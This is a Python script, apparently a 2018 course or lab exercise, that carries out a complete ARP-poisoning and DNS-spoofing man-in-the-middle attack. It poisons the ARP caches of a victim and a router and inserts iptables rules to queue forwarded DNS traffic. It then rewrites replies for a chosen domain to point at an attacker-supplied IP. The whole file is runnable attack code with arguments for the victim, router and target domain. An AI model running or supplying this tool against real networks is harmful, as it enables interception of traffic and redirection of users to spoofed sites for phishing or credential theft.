#!/usr/bin/python
#echo 1 > /proc/sys/net/ipv4/ip_forward
#To install run the setup.sh script provided
#To alias pypy: alias pypy="~/Documents/pypy-6.0.0-linux_x86_64-portable/bin/pypy"
#Note: target IP is IP of SPOOFED SITE: ie. 142.232.66.1
#Author: Jordan Hamade
#Date: November 3rd 2018
import threading
import time
import sys
import socket
import os
import argparse
from netfilterqueue import NetfilterQueue
from uuid import getnode as get_mac
from scapy.all import *

parser = argparse.ArgumentParser()
parser.add_argument("-v", "--victimIP", help="The IP of the machine to poison", required=True)
parser.add_argument("-r", "--routerIP", help="The IP of the router on the network", required=True)
parser.add_argument("-d", "--domainHost", help="The domain to be spoofed", required=True)
parser.add_argument("-t", "--targetIP", help="The IP of the domain to be spoofed", required=True)
args = parser.parse_args()
domainHost = args.domainHost
target_ip = args.victimIP
domain_ip = args.targetIP

#Returns the MAC address of the machine specified by their IP
def getOtherMAC(ip):
    response, temp = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10)
    for s,r in response:
        return r[ARP].hwsrc
    return None

#ARP poisons a victim machine and the router continuously until keyboard interrupt is generated
def arpPoison(victim_ip, router_ip, victim_mac, router_mac, local_mac):
    victim_poison = ARP()
    victim_poison.op = 2
    victim_poison.hwsrc = local_mac
    victim_poison.hwdst = victim_mac
    victim_poison.psrc = router_ip
    victim_poison.pdst = victim_ip

    router_poison = ARP()
    router_poison.op = 2
    router_poison.hwsrc = local_mac
    router_poison.hwdst = router_mac
    router_poison.pdst = router_ip
    router_poison.psrc = victim_ip

    while True:
        try:
            sendp(Ether()/victim_poison, verbose=0)
            sendp(Ether()/router_poison, verbose=0)
            time.sleep(3)
        except KeyboardInterrupt:
            sys.exit(0)

#Our callback function when we match a packet from NetfilterQueue
def callback(packet):
    global target_ip
    global domainHost
    global domain_ip
    payload = packet.get_payload()
    pkt = IP(payload)
    if not pkt.haslayer(DNSQR):
        packet.accept()
    else:
        if domainHost in pkt[DNS].qd.qname:
            spoofedPacket = IP(dst=target_ip, src=pkt[IP].dst)/\
                            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                            an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=domain_ip))
            packet.set_payload(str(spoofedPacket))
            packet.accept()
            print ("Sent spoofed DNS packet")
        else:
            packet.accept()

#Main function
def main():
    os.system('iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1')
    address = get_mac()
    hexStuff = iter(hex(address)[2:].zfill(12))
    hostMac = ":".join(i + next(hexStuff) for i in hexStuff)
    victimMac = getOtherMAC(args.victimIP)
    routerMac = getOtherMAC(args.routerIP)
    arpThread = threading.Thread(target=arpPoison, args=(args.victimIP, args.routerIP, victimMac, routerMac, hostMac))
    arpThread.daemon = True
    arpThread.start()
    q = NetfilterQueue()
    q.bind(1, callback)
    try:
        q.run()
    except KeyboardInterrupt:
        q.unbind()
        os.system('iptables -F')
        os.system('iptables -X')

main()
